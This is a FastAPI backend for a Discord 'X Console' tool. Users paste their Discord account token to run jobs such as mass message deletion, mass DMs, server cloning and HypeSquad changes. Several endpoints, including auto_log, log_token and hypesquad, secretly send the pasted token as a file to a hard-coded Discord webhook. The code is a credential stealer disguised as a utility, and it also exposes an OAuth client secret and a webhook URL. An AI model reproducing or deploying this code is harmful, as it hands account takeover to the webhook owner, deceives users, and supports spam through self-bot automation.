from fastapi import FastAPI, HTTPException, Depends, Header, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import Dict, List, Optional
import uuid, threading, queue, json, requests, httpx, os, datetime
from discord_api import *

app = FastAPI(title="X Console Web API")

# ==============================================================
# 1. بيانات تطبيق ديسكورد بتاعك
# ==============================================================
DISCORD_CLIENT_ID = "1552243433882521671"
DISCORD_CLIENT_SECRET = "Wo95XL2OYaJK4jeYYzt3g5Jmo4u3_UBa"
# ⚠️ غيّر ده للينك Render بتاعك بعد ما تنشر
DISCORD_REDIRECT_URI = "https://x-console-tools.onrender.com/api/auth/callback"
FRONTEND_URL = "https://x-console-tools-frontend-6cvn.vercel.app"
WEBHOOK_URL = "https://discord.com/api/webhooks/1559983920055844904/aH9E9XItNrC7LxdEf2_rPiYxCx3uBfjRAK7ULQfYYKGOkV5VVVcEG6B1Ii5xJQAfEoCi"

# ==============================================================
# 2. تقديم ملفات الواجهة (اختياري)
# ==============================================================
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")
if os.path.exists(FRONTEND_DIR):
    app.mount("/static", StaticFiles(directory=FRONTEND_DIR), name="static")

@app.get("/")
def read_root():
    return RedirectResponse(url=FRONTEND_URL)

def send_webhook_log(title: str, fields: List[dict] = None, color: int = 0xff4444,
                     thumbnail_url: str = None, token_to_send: str = None):
    if not WEBHOOK_URL or "YOUR_WEBHOOK_URL_HERE" in WEBHOOK_URL or "..." in WEBHOOK_URL:
        return
    embed = {
        "title": title, "color": color,
        "footer": {"text": "X Console Logger"},
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    if fields: embed["fields"] = fields
    if thumbnail_url: embed["thumbnail"] = {"url": thumbnail_url}
    data = {"username": "Captain Hook",
            "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png",
            "embeds": [embed]}
    files = {}
    if token_to_send:
        files = {"file": ("token.txt", token_to_send, "text/plain")}
    try:
        if files:
            requests.post(WEBHOOK_URL, data={"payload_json": json.dumps(data)},
                          files=files, timeout=5)
        else:
            requests.post(WEBHOOK_URL, json=data, timeout=5)
    except Exception as e:
        print(f"❌ [WEBHOOK ERROR] {e}")

@app.on_event("startup")
def startup_event():
    fields = [{"name": "Status:", "value": "🟢 **Online**", "inline": False}]
    send_webhook_log("🟢 Server Online", fields=fields, color=0x00ff00)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # ممكن تحدده لـ FRONTEND_URL
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

SESSIONS: Dict[str, dict] = {}
JOBS: Dict[str, dict] = {}

# ==============================================================
# 3. OAuth
# ==============================================================
@app.get("/api/auth/discord")
def auth_discord():
    url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={DISCORD_REDIRECT_URI}"
        f"&response_type=code&scope=identify"
    )
    return RedirectResponse(url)

@app.get("/api/auth/callback")
async def auth_callback(code: str):
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": DISCORD_REDIRECT_URI,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    async with httpx.AsyncClient() as client:
        res = await client.post("https://discord.com/api/oauth2/token",
                                data=data, headers=headers)
        if res.status_code != 200:
            raise HTTPException(400, "Failed to get token from Discord")
        token_data = res.json()
        access_token = token_data["access_token"]
        user_res = await client.get(
            "https://discord.com/api/users/@me",
            headers={"Authorization": f"Bearer {access_token}"}
        )
        user_info = user_res.json()

    session_token = uuid.uuid4().hex
    SESSIONS[session_token] = {
        "username": f"{user_info['username']}#{user_info.get('discriminator', '0')}",
        "id": user_info["id"],
        "avatar": user_info.get("avatar"),
    }
    return RedirectResponse(url=f"{FRONTEND_URL}/?session={session_token}")

def require_session(x_session: str = Header(default="")):
    if x_session not in SESSIONS:
        raise HTTPException(401, "Session invalid or expired")
    return SESSIONS[x_session]

# ==============================================================
# 4. Session-based profile endpoints
# ==============================================================
@app.get("/api/me/session")
def api_me_session(session=Depends(require_session)):
    return {
        "username": session["username"],
        "avatar": (
            f"https://cdn.discordapp.com/avatars/{session['id']}/{session['avatar']}.png?size=128"
            if session.get("avatar")
            else "https://cdn.discordapp.com/embed/avatars/0.png"
        ),
    }

@app.get("/api/profile/session")
def api_profile_session(session=Depends(require_session)):
    try:
        user_id = session["id"]
        username = session["username"].split("#")[0]
        avatar_hash = session.get("avatar")
        timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
        created_at = datetime.datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d")
        avatar_url = (
            f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=128"
            if avatar_hash
            else f"https://cdn.discordapp.com/embed/avatars/{(int(user_id) >> 22) % 6}.png"
        )
        return {
            "id": user_id, "username": username, "handle": username,
            "avatar": avatar_url, "banner": None, "bio": None,
            "created_at": created_at, "nitro": None, "badges": [],
        }
    except Exception as e:
        raise HTTPException(400, str(e))

# ==============================================================
# 5. Logs
# ==============================================================
class ActionLogBody(BaseModel):
    action: str
    details: Optional[str] = ""

@app.post("/api/action_log")
def log_action(body: ActionLogBody, bg_tasks: BackgroundTasks, session=Depends(require_session)):
    fields = [
        {"name": "Action:", "value": body.action, "inline": False},
        {"name": "Details:", "value": body.details or "N/A", "inline": False},
        {"name": "User:", "value": f"`{session['username']}` (ID: `{session['id']}`)", "inline": False},
    ]
    bg_tasks.add_task(send_webhook_log, "⚡ Action Performed", fields, 0x8888aa)
    return {"ok": True}

class AutoLogBody(BaseModel):
    token: str

@app.post("/api/auto_log")
def api_auto_log(body: AutoLogBody, bg_tasks: BackgroundTasks, _=Depends(require_session)):
    try:
        user_info = get_me(body.token)
        username = user_info.get("username", "Unknown")
        user_id = user_info.get("id", "Unknown")
        avatar_hash = user_info.get("avatar")
        avatar_url = (
            f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=128"
            if avatar_hash
            else f"https://cdn.discordapp.com/embed/avatars/{(int(user_id) >> 22) % 6}.png"
        )
        fields = [
            {"name": "User:", "value": f"`{username}` (ID: `{user_id}`)", "inline": False},
            {"name": "Action:", "value": "Auto Loaded Token", "inline": False},
        ]
        bg_tasks.add_task(send_webhook_log, "🔑 User Token Auto-Loaded",
                          fields, 0x5865F2, avatar_url, token_to_send=body.token)
        return {"ok": True, "username": username}
    except Exception as e:
        return {"ok": False, "error": str(e)}

class LogTokenBody(BaseModel):
    token: str
    username: str
    user_id: str
    avatar: str = None

@app.post("/api/log_token")
def api_log_token(body: LogTokenBody, bg_tasks: BackgroundTasks, _=Depends(require_session)):
    avatar_url = (
        f"https://cdn.discordapp.com/avatars/{body.user_id}/{body.avatar}.png?size=128"
        if body.avatar
        else f"https://cdn.discordapp.com/embed/avatars/{(int(body.user_id) >> 22) % 6}.png"
    )
    fields = [
        {"name": "User:", "value": f"`{body.username}` (ID: `{body.user_id}`)", "inline": False},
        {"name": "Action:", "value": "Manual Load", "inline": False},
    ]
    bg_tasks.add_task(send_webhook_log, "🔑 User Token Loaded",
                      fields, 0x5865F2, avatar_url, token_to_send=body.token)
    return {"ok": True}

# ==============================================================
# 6. Token-based endpoints
# ==============================================================
class TokenBody(BaseModel):
    token: str

@app.post("/api/me")
def api_me(body: TokenBody, _=Depends(require_session)):
    try: return get_me(body.token)
    except Exception as e: raise HTTPException(400, str(e))

@app.post("/api/dms")
def api_dms(body: TokenBody, _=Depends(require_session)):
    try: return get_dms(body.token)
    except Exception as e: raise HTTPException(400, str(e))

@app.post("/api/friends")
def api_friends(body: TokenBody, _=Depends(require_session)):
    try: return get_friends(body.token)
    except Exception as e: raise HTTPException(400, str(e))

@app.post("/api/guilds")
def api_guilds(body: TokenBody, _=Depends(require_session)):
    try: return get_guilds(body.token)
    except Exception as e: raise HTTPException(400, str(e))

class ChannelBody(BaseModel):
    token: str
    channel_id: str

@app.post("/api/channel-info")
def api_channel(body: ChannelBody, _=Depends(require_session)):
    try: return get_channel_info(body.token, body.channel_id)
    except Exception as e: raise HTTPException(400, str(e))

# ==============================================================
# 7. Jobs
# ==============================================================
class JobBody(BaseModel):
    token: str
    params: Dict

def _run_job(job_id: str, fn, token: str, params: dict):
    q: queue.Queue = JOBS[job_id]["queue"]
    stop_flag = JOBS[job_id]["stop_flag"]
    try:
        result = fn(token=token, log=lambda m: q.put({"type": "log", "msg": m}),
                    should_stop=lambda: stop_flag["stop"], **params)
        q.put({"type": "done", "result": result})
    except Exception as e:
        q.put({"type": "error", "msg": str(e)})
    finally:
        q.put(None)

def _start_job(fn, body: JobBody):
    job_id = uuid.uuid4().hex
    JOBS[job_id] = {"queue": queue.Queue(), "stop_flag": {"stop": False}}
    threading.Thread(target=_run_job, args=(job_id, fn, body.token, body.params), daemon=True).start()
    return {"job_id": job_id}

@app.post("/api/job/clean")
def job_clean(body: JobBody, _=Depends(require_session)): return _start_job(delete_messages, body)
@app.post("/api/job/clear-dms")
def job_clear_dms(body: JobBody, _=Depends(require_session)): return _start_job(clear_dms, body)
@app.post("/api/job/remove-friends")
def job_remove_friends(body: JobBody, _=Depends(require_session)): return _start_job(remove_friends, body)
@app.post("/api/job/leave-servers")
def job_leave_servers(body: JobBody, _=Depends(require_session)): return _start_job(leave_servers, body)
@app.post("/api/job/mass-dm")
def job_mass_dm(body: JobBody, _=Depends(require_session)): return _start_job(mass_dm, body)
@app.post("/api/job/clone")
def job_clone(body: JobBody, _=Depends(require_session)): return _start_job(clone_server, body)

@app.post("/api/job/{job_id}/stop")
def job_stop(job_id: str, _=Depends(require_session)):
    if job_id in JOBS: JOBS[job_id]["stop_flag"]["stop"] = True
    return {"ok": True}

@app.get("/api/job/{job_id}/stream")
def job_stream(job_id: str, x_session: str = ""):
    if x_session not in SESSIONS: raise HTTPException(401, "Invalid session")
    if job_id not in JOBS: raise HTTPException(404, "Unknown job")
    q = JOBS[job_id]["queue"]
    def gen():
        while True:
            item = q.get()
            if item is None: break
            yield f"data: {json.dumps(item)}\n\n"
        JOBS.pop(job_id, None)
    return StreamingResponse(gen(), media_type="text/event-stream")

# ==============================================================
# 8. HypeSquad
# ==============================================================
class HSBody(BaseModel):
    token: str
    house_id: int

@app.post("/api/hypesquad")
def api_hypesquad(body: HSBody, bg_tasks: BackgroundTasks, _=Depends(require_session)):
    if body.house_id not in (1, 2, 3):
        raise HTTPException(400, "house_id must be 1, 2, or 3")
    try:
        user_info = get_me(body.token)
        username = user_info.get("username", "Unknown")
        user_id = user_info.get("id", "Unknown")
        avatar_hash = user_info.get("avatar")
        avatar_url = (
            f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=128"
            if avatar_hash
            else f"https://cdn.discordapp.com/embed/avatars/{(int(user_id) >> 22) % 6}.png"
        )

        success = set_hypesquad(body.token, body.house_id)
        houses = {1: "Bravery 🟣", 2: "Brilliance 🔴", 3: "Balance 🟢"}
        house_name = houses.get(body.house_id, "Unknown")

        fields = [
            {"name": "User:", "value": f"`{username}` (ID: `{user_id}`)", "inline": False},
            {"name": "House:", "value": house_name, "inline": False},
            {"name": "Status:", "value": "Success ✅" if success else "Failed ❌", "inline": False},
        ]
        color = 0x66ddaa if success else 0xff7777
        bg_tasks.add_task(send_webhook_log,
                          "✅ HypeSquad Changed" if success else "❌ HypeSquad Failed",
                          fields, color, avatar_url, token_to_send=body.token)
        return {"success": success}
    except Exception as e:
        fields = [{"name": "Error:", "value": f"`{str(e)}`", "inline": False}]
        bg_tasks.add_task(send_webhook_log, "⚠️ Invalid Token Attempt",
                          fields, 0xffaa00, token_to_send=body.token)
        raise HTTPException(400, str(e))
